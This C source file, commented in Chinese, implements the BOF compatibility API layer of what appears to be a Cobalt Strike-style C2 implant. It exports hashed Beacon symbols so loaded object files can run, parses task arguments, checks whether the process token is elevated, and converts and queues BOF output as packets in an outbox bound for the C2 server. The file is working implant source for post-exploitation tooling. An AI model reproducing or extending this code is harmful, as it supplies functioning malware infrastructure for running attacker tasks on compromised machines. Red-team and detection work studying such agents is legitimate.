#include "beacon_bof.h"

#include <intrin.h>

#pragma intrinsic(_ReturnAddress)

/*
 * BOF 兼容 API 层。
 * 这里暴露 BeaconData/BeaconFormat/BeaconPrintf 等符号给 BOF 加载器解析，
 * 输出上下文通过当前 BOF runtime 定位，避免多个 BOF 并发时串包。
 */

/* BOF 键值存储条目 */
typedef struct _BofValueEntry {
    CHAR key[64];
    PVOID value;
} BofValueEntry;

static BofValueEntry g_bofValues[32] = { {0} }; /* BOF 键值存储表 */
static INIT_ONCE g_bofValueInitOnce = INIT_ONCE_STATIC_INIT;
static CRITICAL_SECTION g_bofValueLock;

static BOOL CALLBACK BofValueInitOnce(PINIT_ONCE init_once, PVOID parameter, PVOID* context)
{
    (VOID)init_once;
    (VOID)parameter;
    (VOID)context;

    InitializeCriticalSection(&g_bofValueLock);
    return TRUE;
}

static BOOL BofValueEnsureInit(VOID)
{
    return InitOnceExecuteOnce(&g_bofValueInitOnce, BofValueInitOnce, NULL, NULL);
}

/* ===== Beacon API 符号表 ===== */

/* BOF 中 __imp_BeaconXxx 符号的哈希 → 函数指针映射 */
COFFAPIFUNC BeaconApi[] = {
    { .NameHash = BEACONDATAPARSE_HASH,       .Pointer = BeaconDataParse },
    { .NameHash = BEACONDATAINT_HASH,         .Pointer = BeaconDataInt },
    { .NameHash = BEACONDATASHORT_HASH,       .Pointer = BeaconDataShort },
    { .NameHash = BEACONDATAEXTRACT_HASH,     .Pointer = BeaconDataExtract },
    { .NameHash = BEACONDATALENGTH_HASH,      .Pointer = BeaconDataLength },
    { .NameHash = BEACONFORMATALLOC_HASH,     .Pointer = BeaconFormatAlloc },
    { .NameHash = BEACONFORMATFREE_HASH,      .Pointer = BeaconFormatFree },
    { .NameHash = BEACONFORMATRESET_HASH,     .Pointer = BeaconFormatReset },
    { .NameHash = BEACONFORMATAPPEND_HASH,    .Pointer = BeaconFormatAppend },
    { .NameHash = BEACONFORMATINT_HASH,       .Pointer = BeaconFormatInt },
    { .NameHash = BEACONFORMATPRINTF_HASH,    .Pointer = BeaconFormatPrintf },
    { .NameHash = BEACONFORMATTOSTRING_HASH,  .Pointer = BeaconFormatToString },
    { .NameHash = BEACONPRINTF_HASH,          .Pointer = BeaconPrintf },
    { .NameHash = BEACONOUTPUT_HASH,          .Pointer = BeaconOutput },
    { .NameHash = BEACONISADMIN_HASH,         .Pointer = BeaconIsAdmin },
    { .NameHash = BEACONADDVALUE_HASH,        .Pointer = BeaconAddValue },
    { .NameHash = BEACONGETVALUE_HASH,        .Pointer = BeaconGetValue },
    { .NameHash = BEACONREMOVEVALUE_HASH,     .Pointer = BeaconRemoveValue },
    { .NameHash = BEACONGETSTOPJOBEVENT_HASH, .Pointer = BeaconGetStopJobEvent },
    { .NameHash = BEACONWAKEUP_HASH,          .Pointer = BeaconWakeup },
    { .NameHash = 0,                          .Pointer = NULL }
};

/* ===== 输出辅助函数 ===== */

/* 判断回调类型是否为文本输出 */
static INT BofIsTextCallback(INT Type)
{
    return Type == CALLBACK_OUTPUT ||
           Type == CALLBACK_OUTPUT_OEM ||
           Type == CALLBACK_ERROR ||
           Type == CALLBACK_OUTPUT_UTF8;
}

/* 根据回调类型获取对应的代码页 */
static UINT BofOutputCodePage(BeaconContext* ctx, INT Type)
{
    UINT cp = 0;

    if (!ctx) return CP_ACP;
    if (Type == CALLBACK_OUTPUT_UTF8) return CP_UTF8;

    /* OEM 回调使用 OEM 代码页 */
    if (Type == CALLBACK_OUTPUT_OEM) {
        if (ctx->api.pfnGetOEMCP) {
            cp = ctx->api.pfnGetOEMCP();
        }
        if (cp == 0 && ctx->api.pfnGetConsoleCP) {
            cp = ctx->api.pfnGetConsoleCP();
        }
    }

    /* 回退到系统 ACP */
    if (cp == 0) {
        cp = ctx->meta.acp;
    }
    if (cp == 0 && ctx->api.pfnGetACP) {
        cp = ctx->api.pfnGetACP();
    }
    if (cp == 0) {
        cp = CP_ACP;
    }

    return cp;
}

/* 直接复制输出数据到 ByteBuf */
static INT BofCopyOutput(ByteBuf* out, const BYTE8* data, INT len)
{
    BbFree(out);
    BbInit(out);
    return BbAppend(out, data, (SIZE_T)len);
}

/* 将 BOF 输出从源代码页转换为 UTF-8 */
static INT BofConvertOutputToUtf8(BeaconContext* ctx, INT Type,
                                  const BYTE8* data, INT len, ByteBuf* out)
{
    PWin32Api api;
    UINT cp;
    INT wlen;
    INT ulen;
    INT ok = 0;
    WCHAR* wide = NULL;
    CHAR* utf8 = NULL;

    BbInit(out);

    if (!ctx || !data || len <= 0) return 0;

    /* 非文本回调直接透传 */
    if (!BofIsTextCallback(Type)) {
        return BbAppend(out, data, (SIZE_T)len);
    }

    /* 已经是 UTF-8 则直接透传 */
    cp = BofOutputCodePage(ctx, Type);
    if (Type == CALLBACK_OUTPUT_UTF8 || cp == CP_UTF8) {
        return BbAppend(out, data, (SIZE_T)len);
    }

    /* 缺少转换 API 则直接透传 */
    api = &ctx->api;
    if (!api->pfnMultiByteToWideChar || !api->pfnWideCharToMultiByte) {
        return BbAppend(out, data, (SIZE_T)len);
    }

    /* 多字节 → 宽字符 */
    wlen = api->pfnMultiByteToWideChar(cp, 0, (LPCCH)data, len, NULL, 0);
    if (wlen <= 0) {
        return BbAppend(out, data, (SIZE_T)len);
    }

    wide = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(wlen + 1) * sizeof(WCHAR));
    if (!wide) {
        return BbAppend(out, data, (SIZE_T)len);
    }

    if (api->pfnMultiByteToWideChar(cp, 0, (LPCCH)data, len, wide, wlen) != wlen) {
        goto Cleanup;
    }

    /* 宽字符 → UTF-8 */
    ulen = api->pfnWideCharToMultiByte(CP_UTF8, 0, wide, wlen, NULL, 0, NULL, NULL);
    if (ulen <= 0) {
        goto Cleanup;
    }

    utf8 = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ulen + 1);
    if (!utf8) {
        goto Cleanup;
    }

    if (api->pfnWideCharToMultiByte(CP_UTF8, 0, wide, wlen, utf8, ulen, NULL, NULL) != ulen) {
        goto Cleanup;
    }

    ok = BbAppend(out, utf8, (SIZE_T)ulen);

Cleanup:
    /* 安全释放临时缓冲区 */
    if (utf8) {
        SecureZeroMemory(utf8, (SIZE_T)ulen);
        HeapFree(GetProcessHeap(), 0, utf8);
    }
    if (wide) {
        SecureZeroMemory(wide, (SIZE_T)(wlen + 1) * sizeof(WCHAR));
        HeapFree(GetProcessHeap(), 0, wide);
    }
    if (!ok) {
        ok = BofCopyOutput(out, data, len);
    }
    return ok;
}

/* 发送 BOF 输出到 Outbox（转换为 UTF-8 后封装为最终数据包） */
static VOID BofSendOutput(BofJobRuntime* runtime, INT Type, const BYTE8* data, INT len)
{
    BeaconContext* ctx;
    ByteBuf final;
    ByteBuf text;

    ctx = BofRuntimeGetContext(runtime);
    if (!ctx || !data || len <= 0) return;

    if (!BofConvertOutputToUtf8(ctx, Type, data, len, &text)) return;

    final = PacketMakeFinal(BofRuntimeGetTaskId(runtime), 70u, &text);
    OutboxEnqueue(&ctx->outbox, final);
    BbFree(&text);
}

/* ===== 字节序转换 ===== */

/* 大小端交换（用于 BeaconFormatInt 的 big-endian 编码） */
static UINT32 BofSwapEndian(UINT32 in)
{
    UINT32 testint = 0xaabbccdd;
    UINT32 out = in;

    if (((BYTE*)&testint)[0] == 0xdd) {
        ((BYTE*)&out)[0] = ((BYTE*)&in)[3];
        ((BYTE*)&out)[1] = ((BYTE*)&in)[2];
        ((BYTE*)&out)[2] = ((BYTE*)&in)[1];
        ((BYTE*)&out)[3] = ((BYTE*)&in)[0];
    }

    return out;
}

/* ===== 数据解析 API ===== */

/* 初始化参数解析器，跳过前 4 字节总长度头 */
VOID BeaconDataParse(PDATA parser, PCHAR buffer, INT size)
{
    if (!parser) return;

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = 0;
    parser->size     = 0;

    if (!buffer || size < 4) return;

    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer  += 4;
}

/* 从参数缓冲区读取一个 INT（跳过 4 字节类型头 + 4 字节值） */
INT BeaconDataInt(PDATA parser)
{
    UINT32 val = 0;

    if (!parser || parser->length < 8) return 0;

    memcpy(&val, parser->buffer + 4, 4);
    parser->buffer  += 8;
    parser->length  -= 8;

    return (INT)val;
}

/* 从参数缓冲区读取一个 SHORT（跳过 4 字节类型头 + 2 字节值） */
SHORT BeaconDataShort(PDATA parser)
{
    UINT16 val = 0;

    if (!parser || parser->length < 6) return 0;

    memcpy(&val, parser->buffer + 4, 2);
    parser->buffer  += 6;
    parser->length  -= 6;

    return (SHORT)val;
}

/* 从参数缓冲区提取一个带长度前缀的字节段 */
PCHAR BeaconDataExtract(PDATA parser, PINT size)
{
    INT len = 0;
    PCHAR data = NULL;

    if (!parser || parser->length < 4) return NULL;

    memcpy(&len, parser->buffer, 4);
    if (len < 0 || parser->length - 4 < len) {
        parser->length = 0;
        if (size) *size = 0;
        return NULL;
    }

    parser->buffer += 4;
    data = parser->buffer;
    if (!data) return NULL;

    parser->length -= 4;
    parser->length -= len;
    parser->buffer += len;

    if (size) *size = len;

    return data;
}

/* 获取参数缓冲区剩余字节数 */
INT BeaconDataLength(PDATA parser)
{
    if (!parser) return 0;
    return parser->length;
}

/* ===== 格式化缓冲区 API ===== */

/* 分配格式化缓冲区 */
VOID BeaconFormatAlloc(PFORMAT format, INT maxsz)
{
    if (!format) return;

    format->original = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxsz);
    if (!format->original) return;

    format->buffer = format->original;
    format->length = 0;
    format->size   = maxsz;
}

/* 释放格式化缓冲区（清零后释放） */
VOID BeaconFormatFree(PFORMAT format)
{
    if (!format) return;

    if (format->original) {
        memset(format->original, 0, (SIZE_T)format->length);
        HeapFree(GetProcessHeap(), 0, format->original);
        format->original = NULL;
    }

    format->buffer = NULL;
    format->length = 0;
    format->size   = 0;
}

/* 重置格式化缓冲区（清零但不释放） */
VOID BeaconFormatReset(PFORMAT format)
{
    if (!format || !format->original) return;

    memset(format->original, 0, (SIZE_T)format->size);
    format->buffer = format->original;
    format->length = 0;
}

/* 追加原始字节到格式化缓冲区 */
VOID BeaconFormatAppend(PFORMAT format, PCHAR text, INT len)
{
    if (!format || !text || len <= 0) return;
    if (format->length + len > format->size) return;

    memcpy(format->buffer, text, (SIZE_T)len);
    format->buffer += len;
    format->length += len;
}

/* 追加一个 big-endian INT 到格式化缓冲区 */
VOID BeaconFormatInt(PFORMAT format, INT value)
{
    UINT32 out;

    if (!format || format->length + 4 > format->size) return;

    out = BofSwapEndian((UINT32)value);
    memcpy(format->buffer, &out, 4);
    format->length += 4;
    format->buffer += 4;
}

/* 格式化追加 printf 风格字符串到缓冲区 */
VOID BeaconFormatPrintf(PFORMAT format, PCHAR fmt, ...)
{
    va_list ap;
    va_list measure;
    INT len;
    SIZE_T remaining;

    if (!format || !fmt || !format->buffer) return;

    /* 计算格式化后的长度 */
    va_start(ap, fmt);
    va_copy(measure, ap);
    len = FmtVscprintfA(fmt, measure);
    va_end(measure);

    if (len < 0 || format->length >= format->size) {
        va_end(ap);
        return;
    }

    remaining = (SIZE_T)(format->size - format->length);
    if ((SIZE_T)len >= remaining) {
        va_end(ap);
        return;
    }

    /* 执行格式化 */
    FmtVsnprintfA(format->buffer, remaining, fmt, ap);
    va_end(ap);

    format->length += len;
    format->buffer += len;
}

/* 获取格式化缓冲区内容指针和长度 */
PCHAR BeaconFormatToString(PFORMAT format, PINT size)
{
    if (!format) return NULL;

    if (size) *size = format->length;
    if (format->original) format->original[format->length] = '\0';

    return format->original;
}

/* ===== 输出 API（通过 Outbox 发送回 C2） ===== */

/* 格式化输出（BeaconPrintf 回调，BOF 中调用） */
VOID BeaconPrintf(INT Type, PCHAR fmt, ...)
{
    BofJobRuntime* runtime;
    va_list ap;
    va_list measure;
    INT len;
    PCHAR buf;

    if (!fmt) return;
    runtime = BofGetCurrentRuntime(_ReturnAddress());
    if (!runtime) return;

    /* 计算格式化长度 */
    va_start(ap, fmt);
    va_copy(measure, ap);
    len = FmtVscprintfA(fmt, measure);
    va_end(measure);

    if (len < 0) {
        va_end(ap);
        return;
    }

    /* 分配缓冲区并格式化 */
    buf = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
    if (!buf) {
        va_end(ap);
        return;
    }

    FmtVsnprintfA(buf, (SIZE_T)len + 1, fmt, ap);
    va_end(ap);

    BofSendOutput(runtime, Type, (const BYTE8*)buf, len);

    /* 安全释放临时缓冲区 */
    memset(buf, 0, (SIZE_T)len);
    HeapFree(GetProcessHeap(), 0, buf);
}

/* 原始输出（BeaconOutput 回调，BOF 中调用） */
VOID BeaconOutput(INT Type, PCHAR data, INT len)
{
    BofJobRuntime* runtime;

    if (!data || len <= 0) return;
    runtime = BofGetCurrentRuntime(_ReturnAddress());
    if (!runtime) return;
    BofSendOutput(runtime, Type, (const BYTE8*)data, len);
}

/* ===== 系统信息 API ===== */

/* 检查当前进程是否以管理员权限运行 */
BOOL BeaconIsAdmin(VOID)
{
    BofJobRuntime* runtime = BofGetCurrentRuntime(_ReturnAddress());
    BeaconContext* ctx = BofRuntimeGetContext(runtime);
    HANDLE hToken = NULL;
    BOOL bIsAdmin = FALSE;
    DWORD dwSize = 0;
    TOKEN_ELEVATION elevation = { 0 };

    if (!ctx) return FALSE;

    if (ctx->api.pfnOpenProcessToken &&
        ctx->api.pfnGetTokenInformation) {

        if (ctx->api.pfnOpenProcessToken(
                ctx->api.pfnGetCurrentProcess(), TOKEN_QUERY, &hToken)) {

            dwSize = sizeof(TOKEN_ELEVATION);
            if (ctx->api.pfnGetTokenInformation(
                    hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
                bIsAdmin = elevation.TokenIsElevated;
            }

            if (hToken) ctx->api.pfnNtClose(hToken);
        }
    }

    return bIsAdmin;
}

/* ===== 键值存储 API ===== */

/* 添加或更新一个键值对 */
BOOL BeaconAddValue(PCHAR key, PVOID ptr)
{
    SIZE_T keyLen;
    DWORD freeIndex = (DWORD)-1;
    BOOL ok = FALSE;

    if (!key) return FALSE;

    keyLen = strlen(key);
    if (keyLen == 0 || keyLen >= sizeof(g_bofValues[0].key)) return FALSE;
    if (!BofValueEnsureInit()) return FALSE;

    EnterCriticalSection(&g_bofValueLock);

    /* 查找已有键或空闲槽位 */
    for (DWORD i = 0; i < ARRAYSIZE(g_bofValues); i++) {
        if (g_bofValues[i].key[0] == '\0') {
            if (freeIndex == (DWORD)-1) freeIndex = i;
            continue;
        }
        if (strcmp(g_bofValues[i].key, key) == 0) {
            g_bofValues[i].value = ptr;
            ok = TRUE;
            goto Done;
        }
    }

    /* 写入空闲槽位 */
    if (freeIndex == (DWORD)-1) goto Done;

    memcpy(g_bofValues[freeIndex].key, key, keyLen + 1);
    g_bofValues[freeIndex].value = ptr;
    ok = TRUE;

Done:
    LeaveCriticalSection(&g_bofValueLock);
    return ok;
}

/* 根据键名获取值 */
PVOID BeaconGetValue(PCHAR key)
{
    PVOID value = NULL;

    if (!key) return NULL;
    if (!BofValueEnsureInit()) return NULL;

    EnterCriticalSection(&g_bofValueLock);

    for (DWORD i = 0; i < ARRAYSIZE(g_bofValues); i++) {
        if (g_bofValues[i].key[0] && strcmp(g_bofValues[i].key, key) == 0) {
            value = g_bofValues[i].value;
            break;
        }
    }

    LeaveCriticalSection(&g_bofValueLock);
    return value;
}

/* 根据键名删除键值对 */
BOOL BeaconRemoveValue(PCHAR key)
{
    BOOL ok = FALSE;

    if (!key) return FALSE;
    if (!BofValueEnsureInit()) return FALSE;

    EnterCriticalSection(&g_bofValueLock);

    for (DWORD i = 0; i < ARRAYSIZE(g_bofValues); i++) {
        if (g_bofValues[i].key[0] && strcmp(g_bofValues[i].key, key) == 0) {
            SecureZeroMemory(&g_bofValues[i], sizeof(g_bofValues[i]));
            ok = TRUE;
            break;
        }
    }

    LeaveCriticalSection(&g_bofValueLock);
    return ok;
}

/* ===== 异步 BOF API ===== */

/* 获取 BOF 任务的取消事件句柄（用于 BeaconGetStopJobEvent） */
HANDLE BeaconGetStopJobEvent(VOID)
{
    return BofRuntimeGetStopEvent(BofGetCurrentRuntime(_ReturnAddress()));
}

/* 唤醒 Beacon 主循环（用于长时间运行的 BOF 立即触发下一次心跳） */
VOID BeaconWakeup(VOID)
{
    BofJobRuntime* runtime;
    BeaconContext* ctx;

    runtime = BofGetCurrentRuntime(_ReturnAddress());
    ctx = BofRuntimeGetContext(runtime);
    if (!ctx || !ctx->runtime.wake_event) return;

    if (ctx->api.pfnSetEvent) {
        ctx->api.pfnSetEvent(ctx->runtime.wake_event);
    } else {
        SetEvent(ctx->runtime.wake_event);
    }
}

/* ===== 工具函数 ===== */

/* ANSI 转 Unicode（toWideChar 回调，BOF 中调用） */
BOOL toWideChar(PCHAR src, WCHAR* dst, INT max)
{
    if (!src || !dst || max < (INT)sizeof(WCHAR)) return FALSE;
    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, src, -1, dst, max / (INT)sizeof(WCHAR));
}
